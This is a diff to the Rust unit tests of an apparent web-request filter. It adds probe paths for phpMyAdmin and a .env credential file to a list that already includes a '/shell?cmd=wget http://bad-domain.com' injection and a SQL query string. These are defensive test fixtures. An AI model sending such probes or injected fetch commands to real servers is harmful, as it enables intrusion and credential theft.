@@ -45,7 +45,11 @@ mod tests {
             "/shell?cmd=wget http://bad-domain.com",
             "/query?q=SELECT+*+FROM+users",
             "/service/api-docs",
+            "/mysqladmin/index.php?lang=en",
+            "/mail/.env.db",
+            "/db/phpmyadmin/index.php?lang=en",
         ];
+
         for path in bad_paths {
             assert!(is_bad_apache(path), "Should match: {}", path);
         }
